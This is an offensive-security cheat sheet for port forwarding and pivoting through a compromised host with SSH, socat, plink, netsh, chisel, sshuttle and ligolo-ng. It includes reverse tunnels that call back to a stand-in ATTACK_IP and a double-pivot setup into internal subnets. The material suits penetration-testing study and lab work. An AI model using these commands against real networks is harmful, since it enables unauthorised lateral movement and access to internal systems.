# Port Forwarding

## Simple Port Forwarding
### SSH
```bash
# Local port forward example from local port 1234 to 1080 on TARGET_IP.
# Port listener is on the ATTACK machine.
ssh USERNAME@COMPROMISED_HOST -L localhost:1234:TARGET_IP:1080

# Reverse port forward example from port 1234 on COMPROMISED_HOST to port 1080 on target machine.
# Port listener is on the COMPROMISED HOST.
ssh USERNAME@COMPROMISED_HOST -R 1234:TARGET_IP:1080
```

### Socat
```bash
# Connect from port 1234 on compromised host to port 1080 on target machine.
socat TCP-LISTEN:1234,fork TCP:TARGET_IP:1080
```

### Plink.exe (Windows only)
```bash
# Local port forward
plink.exe -ssh -l <USERNAME> -p <PASSWORD> -L localhost:1234:TARGET_IP:1080

# Reverse port forward
plink.exe -ssh -l <USERNAME> -p <PASSWORD> -R 1234:TARGET_IP:1080
```

### Netsh.exe (Windows only)
```Powershell
# Local port forwarding
netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=1080 connectaddress=TARGET_IP
```

## Dynamic Port Forwarding
### SSH
```bash
# Local dynamic port forwarding through SOCKS5 proxy on port 1080 (Need to set local IP and port 1080 on proxychains configuration)
ssh -D 1080 USERNAME@COMPROMISED_HOST

# Reverse dynamic port forwarding through SOCKS5 proxy on COMPROMISED_HOST port 1080 (Need to set COMPROMISED_HOST IP in proxychains configuration)
ssh -R 1080 USERNAME@COMPROMISED_HOST
```

### Chisel
```bash
# Local pivoting - COMPROMISED HOST being the server
./chisel server -v -p 1234 --socks5
# Connecting through attack machine
./chisel client -v COMPROMISED_HOST:1234 socks

# Reverse pivoting - ATTACK_IP being the server
./chisel server --reverse -v -p 1234 --socks5
# Connecting through COMPROMISED_HOST
./chisel client -v ATTACK_IP:1234 R:socks
# Optional - add specific port forwards in addition to socks5 on the client
# Opens listener on port 8080 on COMPROMISED_HOST and directs connections to PORT 80 on ATTACK_IP - useful for webservers / file download in internal network.
./chisel client -v ATTACK_IP:1234 R:socks L:0.0.0.0:8080:ATTACK_IP:80
```
### SSHUTTLE
```bash
# Gives access to internal network without use of proxychains similar to VPN.
sshuttle -r USERNAME@COMPROMISED_HOST:PORT <INTERNAL_SUBNET> <INTERNAL_SUBNET>
```

### Ligolo-ng
```bash
# Start server on attack machine (default port 11601)
ligolo-proxy -selfcert

# Connect through COMPROMISED_HOST (Agent 1) after transferring agent binary
./agent -connect ATTACK_IP:11601 --ignore-cert

# Set up tunneling without use of proxychains similar to VPN.
session <SESSION NUMBER>
interface_create --name <INTERFACE_NAME>
route_add --name <INTERFACE_NAME> --route <INTERNAL_SUBNET>
tunnel_start --tun <INTERFACE_NAME>

# Double pivot - create listener on COMPROMISED_HOST (Agent 1)
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:11601

# Connect to the listener with Agent 2 - then set up tunneling for the second internal subnet
./agent --connect COMPROMISED_HOST:4444 --ignore-cert
```